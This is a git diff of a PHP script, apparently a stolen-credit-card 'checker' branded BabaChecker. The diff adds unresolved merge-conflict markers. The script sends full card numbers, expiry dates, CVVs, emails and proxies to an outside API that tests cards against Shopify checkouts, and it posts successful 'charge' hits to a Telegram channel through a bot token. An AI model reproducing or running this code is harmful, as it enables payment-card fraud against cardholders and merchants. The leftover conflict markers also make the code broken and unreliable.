@@ -244,7 +244,11 @@ $level = $binInfo['level'];
 $issuer = $binInfo['issuer'];
 $country_info = $binInfo['country_info'];
 curl_close($chBin);
+<<<<<<< HEAD
 $requestUrl = "https://ethnix.net/api/autog.php?cc={$cc}|{$month}|{$year}|{$cvv}&email={$email}&site={$site}&proxy={$proxy}";
+=======
+$requestUrl = "https://babachecker.com/api/autog.php?cc={$cc}|{$month}|{$year}|{$cvv}&email={$email}&site={$site}&proxy={$proxy}";
+>>>>>>> f0e10c4ddeefca130962ae1ec2a89d1fe968e85b
 $req = curl_init();
 curl_setopt_array($req, [
     CURLOPT_URL => $requestUrl,
@@ -356,7 +360,11 @@ if (
         "<b>Response ➜</b> {$err}\n" .
         "<b>Gateway ➜</b> Auto Shopify GraphQL\n" .
         "━━━━━━━━\n" .
+<<<<<<< HEAD
         "<b>Hit From:</b> <a href=\"https://ethnix.net\">BabaChecker</a>";
+=======
+        "<b>Hit From:</b> <a href=\"https://babachecker.com\">BabaChecker</a>";
+>>>>>>> f0e10c4ddeefca130962ae1ec2a89d1fe968e85b
     sendTelegramMessage($botToken, '-1002552641928', $publicMessage);
     $result = json_encode([
         'status' => 'charge',
@@ -629,4 +637,8 @@ if (
     echo $result;
     exit;
 }
+<<<<<<< HEAD
 ?>
+=======
+?>
+>>>>>>> f0e10c4ddeefca130962ae1ec2a89d1fe968e85b
